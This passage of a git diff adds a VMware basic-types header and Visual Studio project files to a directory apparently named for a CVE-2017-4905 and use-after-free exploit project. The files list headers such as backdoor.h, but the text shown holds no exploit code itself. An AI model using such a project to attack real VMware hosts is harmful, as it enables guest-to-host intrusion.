+#endif
+#define CONST         const
+
+
+#ifndef INLINE
+#   ifdef _MSC_VER
+#      define INLINE        __inline
+#   else
+#      define INLINE        inline
+#   endif
+#endif
+
+
+/*
+ * Annotation for data that may be exported into a DLL and used by other
+ * apps that load that DLL and import the data.
+ */
+#if defined(_WIN32) && defined(VMX86_IMPORT_DLLDATA)
+#  define VMX86_EXTERN_DATA       extern __declspec(dllimport)
+#else // !_WIN32
+#  define VMX86_EXTERN_DATA       extern
+#endif
+
+#ifdef _WIN32
+
+/* under windows, __declspec(thread) is supported since VS 2003 */
+#define __thread __declspec(thread)
+
+#else
+
+/*
+ * under other platforms instead, __thread is supported by gcc since
+ * version 3.3.1 and by clang since version 3.x
+ */
+
+#endif
+
+
+/*
+ * Due to the wonderful "registry redirection" feature introduced in
+ * 64-bit Windows, if you access any key under HKLM\Software in 64-bit
+ * code, you need to open/create/delete that key with
+ * VMKEY_WOW64_32KEY if you want a consistent view with 32-bit code.
+ */
+
+#ifdef _WIN32
+#ifdef _WIN64
+#define VMW_KEY_WOW64_32KEY KEY_WOW64_32KEY
+#else
+#define VMW_KEY_WOW64_32KEY 0x0
+#endif
+#endif
+
+
+/*
+ * At present, we effectively require a compiler that is at least
+ * gcc-3.3 (circa 2003).  Enforce this here, various things below
+ * this line depend upon it.
+ *
+ * In practice, most things presently compile with gcc-4.1 or gcc-4.4.
+ * The various linux kernel modules may use older (gcc-3.3) compilers.
+ */
+#if defined __GNUC__ && (__GNUC__ < 3 || (__GNUC__ == 3 && __GNUC_MINOR__ < 3))
+#error "gcc version is too old to compile assembly, need gcc-3.3 or better"
+#endif
+
+
+/*
+ * Consider the following reasons functions are inlined:
+ *
+ *  1) inlined for performance reasons
+ *  2) inlined because it's a single-use function
+ *
+ * Functions which meet only condition 2 should be marked with this
+ * inline macro; It is not critical to be inlined (but there is a
+ * code-space & runtime savings by doing so), so when other callers
+ * are added the inline-ness should be removed.
+ */
+
+#if defined __GNUC__
+/*
+ * Starting at version 3.3, gcc does not always inline functions marked
+ * 'inline' (it depends on their size and other factors). To force gcc
+ * to inline a function, one must use the __always_inline__ attribute.
+ * This attribute should be used sparingly and with care.  It is usually
+ * preferable to let gcc make its own inlining decisions
+ */
+#   define INLINE_ALWAYS INLINE __attribute__((__always_inline__))
+#else
+#   define INLINE_ALWAYS INLINE
+#endif
+#define INLINE_SINGLE_CALLER INLINE_ALWAYS
+
+/*
+ * Used when a hard guaranteed of no inlining is needed. Very few
+ * instances need this since the absence of INLINE is a good hint
+ * that gcc will not do inlining.
+ */
+
+#if defined(__GNUC__)
+#define ABSOLUTELY_NOINLINE __attribute__((__noinline__))
+#elif defined(_MSC_VER)
+#define ABSOLUTELY_NOINLINE __declspec(noinline)
+#endif
+
+/*
+ * Used when a function has no effects except the return value and the
+ * return value depends only on the parameters and/or global variables
+ * Such a function can be subject to common subexpression elimination
+ * and loop optimization just as an arithmetic operator would be.
+ */
+
+#if defined(__GNUC__) && (defined(VMM) || defined (VMKERNEL))
+#define SIDE_EFFECT_FREE __attribute__((__pure__))
+#else
+#define SIDE_EFFECT_FREE
+#endif
+
+/*
+ * Used when a function exmaines no input other than its arguments and
+ * has no side effects other than its return value.  Stronger than
+ * SIDE_EFFECT_FREE as the function is not allowed to read from global
+ * memory.
+ */
+
+#if defined(__GNUC__) && (defined(VMM) || defined (VMKERNEL))
+#define CONST_FUNCTION __attribute__((__const__))
+#else
+#define CONST_FUNCTION
+#endif
+
+/*
+ * Attributes placed on function declarations to tell the compiler
+ * that the function never returns.
+ */
+
+#ifdef _MSC_VER
+#define NORETURN __declspec(noreturn)
+#elif defined __GNUC__
+#define NORETURN __attribute__((__noreturn__))
+#else
+#define NORETURN
+#endif
+
+/*
+ * Static profiling hints for functions.
+ *    A function can be either hot, cold, or neither.
+ *    It is an error to specify both hot and cold for the same function.
+ *    Note that there is no annotation for "neither."
+ */
+
+#if defined __GNUC__ && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 3))
+#define HOT __attribute__((hot))
+#define COLD __attribute__((cold))
+#else
+#define HOT
+#define COLD
+#endif
+
+/*
+ * Branch prediction hints:
+ *     LIKELY(exp)   - Expression exp is likely TRUE.
+ *     UNLIKELY(exp) - Expression exp is likely FALSE.
+ *   Usage example:
+ *        if (LIKELY(excCode == EXC_NONE)) {
+ *               or
+ *        if (UNLIKELY(REAL_MODE(vc))) {
+ *
+ * We know how to predict branches on gcc3 and later (hopefully),
+ * all others we don't so we do nothing.
+ */
+
+#if defined __GNUC__
+/*
+ * gcc3 uses __builtin_expect() to inform the compiler of an expected value.
+ * We use this to inform the static branch predictor. The '!!' in LIKELY
+ * will convert any !=0 to a 1.
+ */
+#define LIKELY(_exp)     __builtin_expect(!!(_exp), 1)
+#define UNLIKELY(_exp)   __builtin_expect((_exp), 0)
+#else
+#define LIKELY(_exp)      (_exp)
+#define UNLIKELY(_exp)    (_exp)
+#endif
+
+/*
+ * GCC's argument checking for printf-like functions
+ * This is conditional until we have replaced all `"%x", void *'
+ * with `"0x%08x", (uint32) void *'. Note that %p prints different things
+ * on different platforms.  Argument checking is enabled for the
+ * vmkernel, which has already been cleansed.
+ *
+ * fmtPos is the position of the format string argument, beginning at 1
+ * varPos is the position of the variable argument, beginning at 1
+ */
+
+#if defined(__GNUC__)
+# define PRINTF_DECL(fmtPos, varPos) __attribute__((__format__(__printf__, fmtPos, varPos)))
+#else
+# define PRINTF_DECL(fmtPos, varPos)
+#endif
+
+#if defined(__GNUC__)
+# define SCANF_DECL(fmtPos, varPos) __attribute__((__format__(__scanf__, fmtPos, varPos)))
+#else
+# define SCANF_DECL(fmtPos, varPos)
+#endif
+
+/*
+ * UNUSED_PARAM should surround the parameter name and type declaration,
+ * e.g. "int MyFunction(int var1, UNUSED_PARAM(int var2))"
+ *
+ */
+
+#ifndef UNUSED_PARAM
+# if defined(__GNUC__)
+#  define UNUSED_PARAM(_parm) _parm  __attribute__((__unused__))
+# else
+#  define UNUSED_PARAM(_parm) _parm
+# endif
+#endif
+
+#ifndef UNUSED_TYPE
+// XXX _Pragma would better but doesn't always work right now.
+#  define UNUSED_TYPE(_parm) UNUSED_PARAM(_parm)
+#endif
+
+#ifndef UNUSED_VARIABLE
+// XXX is there a better way?
+#  define UNUSED_VARIABLE(_var) (void)_var
+#endif
+
+/*
+ * gcc can warn us if we're ignoring returns
+ */
+#if defined(__GNUC__)
+# define MUST_CHECK_RETURN __attribute__((warn_unused_result))
+#else
+# define MUST_CHECK_RETURN
+#endif
+
+/*
+ * ALIGNED specifies minimum alignment in "n" bytes.
+ */
+
+#ifdef __GNUC__
+#define ALIGNED(n) __attribute__((__aligned__(n)))
+#else
+#define ALIGNED(n)
+#endif
+
+/*
+ * Once upon a time, this was used to silence compiler warnings that
+ * get generated when the compiler thinks that a function returns
+ * when it is marked noreturn.  Don't do it.  Use NOT_REACHED().
+ */
+
+#define INFINITE_LOOP()           do { } while (1)
+
+/*
+ * On FreeBSD (for the tools build), size_t is typedef'd if _BSD_SIZE_T_
+ * is defined. Use the same logic here so we don't define it twice. [greg]
+ */
+#ifdef __FreeBSD__
+#   ifdef _BSD_SIZE_T_
+#      undef _BSD_SIZE_T_
+#      ifdef VM_I386
+#         ifdef VM_X86_64
+             typedef uint64 size_t;
+#         else
+             typedef uint32 size_t;
+#         endif
+#      endif /* VM_I386 */
+#   endif
+
+#   ifdef _BSD_SSIZE_T_
+#      undef _BSD_SSIZE_T_
+#      ifdef VM_I386
+#         ifdef VM_X86_64
+             typedef int64 ssize_t;
+#         else
+             typedef int32 ssize_t;
+#         endif
+#      endif /* VM_I386 */
+#   endif
+
+#else
+#   if !defined(_SIZE_T) && !defined(_SIZE_T_DEFINED)
+#      ifdef VM_I386
+#         define _SIZE_T
+#         ifdef VM_X86_64
+             typedef uint64 size_t;
+#         else
+             typedef uint32 size_t;
+#         endif
+#      elif defined(VM_ARM_64)
+#         define _SIZE_T
+          typedef uint64 size_t;
+#      elif defined(__arm__)
+#         define _SIZE_T
+          typedef uint32 size_t;
+#      endif
+#   endif
+
+#   if !defined(FROBOS) && !defined(_SSIZE_T) && !defined(_SSIZE_T_) && \
+       !defined(ssize_t) && !defined(__ssize_t_defined) && \
+       !defined(_SSIZE_T_DECLARED) && !defined(_SSIZE_T_DEFINED) && \
+       !defined(_SSIZE_T_DEFINED_)
+#      ifdef VM_I386
+#         define _SSIZE_T
+#         define __ssize_t_defined
+#         define _SSIZE_T_DECLARED
+#         define _SSIZE_T_DEFINED_
+#         ifdef VM_X86_64
+             typedef int64 ssize_t;
+#         else
+             typedef int32 ssize_t;
+#         endif
+#      elif defined(VM_ARM_64)
+#         define _SSIZE_T
+#         define __ssize_t_defined
+#         define _SSIZE_T_DECLARED
+#         define _SSIZE_T_DEFINED_
+          typedef int64 ssize_t;
+#      elif defined(__arm__)
+#         define _SSIZE_T
+#         define __ssize_t_defined
+#         define _SSIZE_T_DECLARED
+#         define _SSIZE_T_DEFINED_
+             typedef int32 ssize_t;
+#      endif
+#   endif
+
+#endif
+
+/*
+ * Format modifier for printing pid_t.  On sun the pid_t is a ulong, but on
+ * Linux it's an int.
+ * Use this like this: printf("The pid is %" FMTPID ".\n", pid);
+ */
+#ifdef sun
+#   ifdef VM_X86_64
+#      define FMTPID "d"
+#   else
+#      define FMTPID "lu"
+#   endif
+#else
+# define FMTPID "d"
+#endif
+
+/*
+ * Format modifier for printing uid_t.  On Solaris 10 and earlier, uid_t
+ * is a ulong, but on other platforms it's an unsigned int.
+ * Use this like this: printf("The uid is %" FMTUID ".\n", uid);
+ */
+#if defined(sun) && !defined(SOL11)
+#   ifdef VM_X86_64
+#      define FMTUID "u"
+#   else
+#      define FMTUID "lu"
+#   endif
+#else
+# define FMTUID "u"
+#endif
+
+/*
+ * Format modifier for printing mode_t.  On sun the mode_t is a ulong, but on
+ * Linux it's an int.
+ * Use this like this: printf("The mode is %" FMTMODE ".\n", mode);
+ */
+#ifdef sun
+#   ifdef VM_X86_64
+#      define FMTMODE "o"
+#   else
+#      define FMTMODE "lo"
+#   endif
+#else
+# define FMTMODE "o"
+#endif
+
+/*
+ * Format modifier for printing time_t. Most platforms define a time_t to be
+ * a long int, but on FreeBSD (as of 5.0, it seems), the time_t is a signed
+ * size quantity. Refer to the definition of FMTSZ to see why we need silly
+ * preprocessor arithmetic.
+ * Use this like this: printf("The mode is %" FMTTIME ".\n", time);
+ */
+#if defined(__FreeBSD__) && (__FreeBSD__ + 0) && ((__FreeBSD__ + 0) >= 5)
+#   define FMTTIME FMTSZ"d"
+#else
+#   if defined(_MSC_VER)
+#      ifndef _SAFETIME_H_
+#         if (_MSC_VER < 1400) || defined(_USE_32BIT_TIME_T)
+#             define FMTTIME "ld"
+#         else
+#             define FMTTIME FMT64"d"
+#         endif
+#      else
+#         ifndef FMTTIME
+#            error "safetime.h did not define FMTTIME"
+#         endif
+#      endif
+#   else
+#      define FMTTIME "ld"
+#   endif
+#endif
+
+#ifdef __APPLE__
+/*
+ * Format specifier for all these annoying types such as {S,U}Int32
+ * which are 'long' in 32-bit builds
+ *       and  'int' in 64-bit builds.
+ */
+#   ifdef __LP64__
+#      define FMTLI ""
+#   else
+#      define FMTLI "l"
+#   endif
+
+/*
+ * Format specifier for all these annoying types such as NS[U]Integer
+ * which are  'int' in 32-bit builds
+ *       and 'long' in 64-bit builds.
+ */
+#   ifdef __LP64__
+#      define FMTIL "l"
+#   else
+#      define FMTIL ""
+#   endif
+#endif
+
+
+/*
+ * Define MXSemaHandle here so both vmmon and vmx see this definition.
+ */
+
+#ifdef _WIN32
+typedef uintptr_t MXSemaHandle;
+#else
+typedef int MXSemaHandle;
+#endif
+
+/*
+ * Define type for poll device handles.
+ */
+
+typedef int64 PollDevHandle;
+
+/*
+ * Define the utf16_t type.
+ */
+
+#if defined(_WIN32) && defined(_NATIVE_WCHAR_T_DEFINED)
+typedef wchar_t utf16_t;
+#else
+typedef uint16 utf16_t;
+#endif
+
+/*
+ * Define for point and rectangle types.  Defined here so they
+ * can be used by other externally facing headers in bora/public.
+ */
+
+typedef struct VMPoint {
+   int x, y;
+} VMPoint;
+
+#if defined _WIN32 && defined USERLEVEL
+struct tagRECT;
+typedef struct tagRECT VMRect;
+#else
+typedef struct VMRect {
+   int left;
+   int top;
+   int right;
+   int bottom;
+} VMRect;
+#endif
+
+/*
+ * ranked locks "everywhere"
+ */
+
+typedef uint32 MX_Rank;
+
+#endif  /* _VM_BASIC_TYPES_H_ */
diff --git a/CVE-2017-4905_and_uaf/vmware/vmware.vcxproj b/CVE-2017-4905_and_uaf/vmware/vmware.vcxproj
new file mode 100644
index 0000000..d17c33f
--- /dev/null
+++ b/CVE-2017-4905_and_uaf/vmware/vmware.vcxproj
@@ -0,0 +1,96 @@
+ï»¿<?xml version="1.0" encoding="utf-8"?>
+<Project DefaultTargets="Build" ToolsVersion="12.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup Label="ProjectConfigurations">
+    <ProjectConfiguration Include="Debug|Win32">
+      <Configuration>Debug</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Release|Win32">
+      <Configuration>Release</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+  </ItemGroup>
+  <PropertyGroup Label="Globals">
+    <ProjectGuid>{04A931F0-9AFF-42E5-AC5F-35F79E9376E9}</ProjectGuid>
+    <Keyword>Win32Proj</Keyword>
+    <RootNamespace>vmware</RootNamespace>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>true</UseDebugLibraries>
+    <PlatformToolset>v120</PlatformToolset>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>v120</PlatformToolset>
+    <WholeProgramOptimization>true</WholeProgramOptimization>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
+  <ImportGroup Label="ExtensionSettings">
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <PropertyGroup Label="UserMacros" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <LinkIncremental>true</LinkIncremental>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <LinkIncremental>false</LinkIncremental>
+  </PropertyGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <ClCompile>
+      <PrecompiledHeader>
+      </PrecompiledHeader>
+      <WarningLevel>Level3</WarningLevel>
+      <Optimization>Disabled</Optimization>
+      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;_LIB;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <SDLCheck>true</SDLCheck>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <PrecompiledHeader>
+      </PrecompiledHeader>
+      <Optimization>MaxSpeed</Optimization>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <IntrinsicFunctions>true</IntrinsicFunctions>
+      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;_LIB;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <SDLCheck>true</SDLCheck>
+      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <GenerateDebugInformation>false</GenerateDebugInformation>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <OptimizeReferences>true</OptimizeReferences>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemGroup>
+    <ClCompile Include="message.cpp" />
+    <ClCompile Include="Source.cpp" />
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="backdoor.h" />
+    <ClInclude Include="backdoor_def.h" />
+    <ClInclude Include="backdoor_types.h" />
+    <ClInclude Include="guest_msg_def.h" />
+    <ClInclude Include="message.h" />
+    <ClInclude Include="vm_basic_types.h" />
+  </ItemGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
+  <ImportGroup Label="ExtensionTargets">
+  </ImportGroup>
+</Project>
\ No newline at end of file
diff --git a/CVE-2017-4905_and_uaf/vmware/vmware.vcxproj.filters b/CVE-2017-4905_and_uaf/vmware/vmware.vcxproj.filters
new file mode 100644
index 0000000..ce4d582
--- /dev/null
+++ b/CVE-2017-4905_and_uaf/vmware/vmware.vcxproj.filters
@@ -0,0 +1,45 @@
+ï»¿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup>
+    <Filter Include="Source Files">
+      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
+      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
+    </Filter>
+    <Filter Include="Header Files">
+      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
+      <Extensions>h;hh;hpp;hxx;hm;inl;inc;xsd</Extensions>
+    </Filter>
+    <Filter Include="Resource Files">
+      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
+      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
+    </Filter>
+  </ItemGroup>
+  <ItemGroup>
+    <ClCompile Include="Source.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="message.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="backdoor.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="backdoor_def.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="backdoor_types.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="vm_basic_types.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="guest_msg_def.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="message.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+  </ItemGroup>
+</Project>
\ No newline at end of file
diff --git a/CVE-2017-4905_and_uaf/vmware/vmware.vcxproj.user b/CVE-2017-4905_and_uaf/vmware/vmware.vcxproj.user
new file mode 100644
index 0000000..541c880
--- /dev/null
+++ b/CVE-2017-4905_and_uaf/vmware/vmware.vcxproj.user
@@ -0,0 +1,7 @@
+ï»¿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="12.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <LocalDebuggerCommandArguments>test</LocalDebuggerCommandArguments>
+    <DebuggerFlavor>WindowsLocalDebugger</DebuggerFlavor>
+  </PropertyGroup>
+</Project>
\ No newline at end of file
